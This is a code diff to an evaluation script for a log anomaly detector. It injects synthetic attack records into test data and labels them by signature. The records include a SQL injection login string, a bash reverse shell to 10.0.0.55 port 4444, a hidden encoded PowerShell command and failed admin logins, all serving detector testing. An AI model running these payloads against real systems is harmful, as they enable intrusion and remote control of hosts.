@@ -7,15 +7,80 @@ from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_sc
 from models.fusion.master_engine import ChakshuFusion
 from models.fusion.master_engine import AssetLoader
 
+def inject_synthetic_threats(log_frames, dataset_name):
+    injected_frames = list(log_frames)
+    timestamp_val = "2026-04-30T12:00:00Z"
+    
+    if "Apache" in dataset_name:
+        for _ in range(25):
+            threat_frame = {
+                "ts": timestamp_val,
+                "src_ip": "192.168.1.100",
+                "payload": "GET /login.php?user=admin' OR '1'='1 HTTP/1.1",
+                "act": "WEB_APP"
+            }
+            injected_frames.append(threat_frame)
+            
+    elif "OpenSSH" in dataset_name:
+        for _ in range(25):
+            threat_frame = {
+                "ts": timestamp_val,
+                "src_ip": "10.0.0.55",
+                "payload": "Failed password for root from 10.0.0.55 port 22 ssh2",
+                "act": "AUTH_LINUX"
+            }
+            injected_frames.append(threat_frame)
+            
+    elif "Linux" in dataset_name:
+        for _ in range(25):
+            threat_frame = {
+                "ts": timestamp_val,
+                "src_ip": "10.0.0.55",
+                "payload": "user root command /bin/bash -i >& /dev/tcp/10.0.0.55/4444 0>&1",
+                "act": "HOST_LINUX"
+            }
+            injected_frames.append(threat_frame)
+            
+    elif "Windows" in dataset_name:
+        for _ in range(25):
+            threat_frame = {
+                "ts": timestamp_val,
+                "src_ip": "10.0.0.55",
+                "payload": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
+                "act": "HOST_WINDOWS"
+            }
+            injected_frames.append(threat_frame)
+            
+    # NEW: Inject Windows Authentication Threats
+    elif "LANL" in dataset_name:
+        for _ in range(25):
+            threat_frame = {
+                "ts": timestamp_val,
+                "src_ip": "10.0.0.88",
+                "payload": "EventID: 4625, Logon Type: 3, Status: 0xC000006D, Failure Reason: Unknown user name or bad password, Account Name: Administrator, Workstation Name: WIN-ATTACKER",
+                "act": "AUTH_WINDOWS"
+            }
+            injected_frames.append(threat_frame)
+            
+    random.shuffle(injected_frames)
+    return injected_frames
+
 def extract_ground_truth(log_frame, dataset_name):
+    payload_value = log_frame.get("payload", "")
+    
     if "L3_L4" in log_frame.get("act", ""):
-        payload_value = log_frame.get("payload", "").upper()
-        if "BENIGN" in payload_value:
+        if "BENIGN" in payload_value.upper():
             return 0
         return 1
 
     if "DDos" in dataset_name or "attack" in dataset_name.lower():
         return 1
+        
+    # NEW: Added 4625 and 0xC000006D to the signature list
+    synthetic_signatures = ["OR '1'='1", "Failed password for root", "/bin/bash -i", "EncodedCommand", "EventID: 4625", "0xC000006D"]
+    if any(sig in payload_value for sig in synthetic_signatures):
+        return 1
+        
     return 0
 
 def calculate_metrics(true_labels, predicted_labels):
@@ -66,10 +131,10 @@ def evaluate_specialists_and_fusion():
         with open(file_path, "r") as input_file:
             log_frames = json.load(input_file)
             
-        log_frames = random.sample(log_frames, min(sample_limit, len(log_frames)))
+        sampled_frames = random.sample(log_frames, min(sample_limit, len(log_frames)))
+        sampled_frames = inject_synthetic_threats(sampled_frames, file_name)
 
-        # Added tqdm progress bar here
-        for log_frame in tqdm(log_frames, desc=f"Evaluating {file_name[:25]:<25}", unit="logs"):
+        for log_frame in tqdm(sampled_frames, desc=f"Evaluating {file_name[:25]:<25}", unit="logs"):
             true_anomaly = extract_ground_truth(log_frame, file_name)
             assigned_tag = log_frame.get("act", "L3_L4")
 
